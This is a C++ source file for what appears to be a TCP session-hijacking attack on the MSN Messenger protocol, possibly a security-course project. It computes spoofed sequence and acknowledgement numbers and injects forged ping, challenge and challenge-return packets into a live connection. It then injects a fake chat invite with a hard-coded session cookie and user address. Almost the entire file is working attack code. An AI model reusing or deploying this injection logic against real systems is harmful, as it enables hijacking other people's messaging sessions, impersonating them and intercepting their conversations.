/* Project Includes */
#include "msnpabth.hpp"

/* Namespace Declarations */
using namespace msnpabth;
using namespace packetwrapper;

const char * MSNPABTH::INVITE_MESSAGE = "1312697181 127.0.0.1:1863 CKI 17021696.318151 eece412alice@hotmail.com Alice U messenger.msn.com 1";

MSNPABTH::MSNPABTH(PacketInjector * packetInjector)
	: started(false), packetInjector(packetInjector), nthPing(0), nthChallenge(0)
{
}

void MSNPABTH::packetReceived(TCPPacket & tcpPacket)
{
	MSNPPacket msnpPacket(tcpPacket);

	switch (msnpPacket.getCommand()) {
		case MSNPPacket::PING_RESPONSE:
			debug("ping response %d", msnpPacket.getTransactionID());
			break;
		case MSNPPacket::CHALLENGE_RESPONSE:
			debug("challenge response %d", msnpPacket.getTransactionID());
			break;
		default:
			break;
	}

	/* General procedure:
	 * 1. Find a ping response.
	 * 2. Generate packets.
	 * 3. Send all pings first to server.
	 * 4. Send all challenges to client.
	 * 5. Send invite.
	 */
	switch (msnpPacket.getCommand()) {
		case MSNPPacket::PING_RESPONSE:
			if (!started)
				createPackets(msnpPacket);

			if (!sendPing())
				break;

		case MSNPPacket::CHALLENGE_RESPONSE:
			if (started && sendChallenge(msnpPacket))
				sendInvite();
			break;

		default:
			break;
	}
}

void MSNPABTH::createPackets(MSNPPacket & pingResponse)
{
	for (unsigned int i = 0; i < PING_NUM; i++) {
		pings[i].setCommand(MSNPPacket::PING);
		pings[i].useReverseAddress(pingResponse);

		pings[i].ackFlag = true;
		pings[i].pshFlag = true;

		if (i == 0) {
			pings[i].seq = pingResponse.ack;
			pings[i].ack = pingResponse.seq + pingResponse.dataLength;
		} else {
			pings[i].seq = pings[i - 1].seq + PING_LENGTH;
			pings[i].ack = pings[i - 1].ack + PING_RESPONSE_LENGTH;
		}

		pingResponseAcks[i].useReverseAddress(pingResponse);

		pingResponseAcks[i].ackFlag = true;

		pingResponseAcks[i].seq = pings[i].seq;
		pingResponseAcks[i].ack = pings[i].ack + PING_RESPONSE_LENGTH;
	}

	for (unsigned int i = 0; i < CHALLENGE_NUM; i++) {
		challenges[i].setCommand(MSNPPacket::CHALLENGE);
		challenges[i].useAddress(pingResponse);

		challenges[i].ackFlag = true;
		challenges[i].pshFlag = true;

		challenges[i].seq = pingResponse.seq + PING_RESPONSE_LENGTH + i * (CHALLENGE_LENGTH + CHALLENGE_RETURN_LENGTH);
		challenges[i].ack = pingResponse.ack + i * CHALLENGE_RESPONSE_LENGTH;

		challengeReturns[i].useAddress(pingResponse);

		challengeReturns[i].ackFlag = true;
		challengeReturns[i].pshFlag = true;

		challengeReturns[i].seq = challenges[i].seq + CHALLENGE_LENGTH;
		challengeReturns[i].ack = challenges[i].ack + CHALLENGE_RESPONSE_LENGTH;
	}

	invite.setCommand(MSNPPacket::INVITE);
	invite.setCustom(INVITE_MESSAGE);
	invite.setLength(INVITE_LENGTH);

	invite.useAddress(pingResponse);

	invite.ackFlag = true;
	invite.pshFlag = true;

	invite.seq = pingResponse.seq + PING_RESPONSE_LENGTH + (CHALLENGE_LENGTH + CHALLENGE_RETURN_LENGTH) * CHALLENGE_NUM;
	invite.ack = pingResponse.ack + CHALLENGE_RESPONSE_LENGTH * CHALLENGE_NUM;

	started = true;
}

bool MSNPABTH::sendPing()
{
	if (nthPing != 0)
		packetInjector->inject(pingResponseAcks[nthPing - 1]);

	if (nthPing < PING_NUM)
		packetInjector->inject(pings[nthPing]);

	if (nthPing++ >= PING_NUM)
		return true;
	else
		return false;
}

bool MSNPABTH::sendChallenge(MSNPPacket & challengeResponse)
{
	if (nthChallenge != 0) {
		challengeReturns[nthChallenge - 1].setCommand(MSNPPacket::CHALLENGE_RETURN, challengeResponse.getTransactionID());
		packetInjector->inject(challengeReturns[nthChallenge - 1]);
	}

	if (nthChallenge < CHALLENGE_NUM)
		packetInjector->inject(challenges[nthChallenge]);

	if (nthChallenge++ >= CHALLENGE_NUM)
		return true;
	else
		return false;
}

void MSNPABTH::sendInvite()
{
	packetInjector->inject(invite);
}
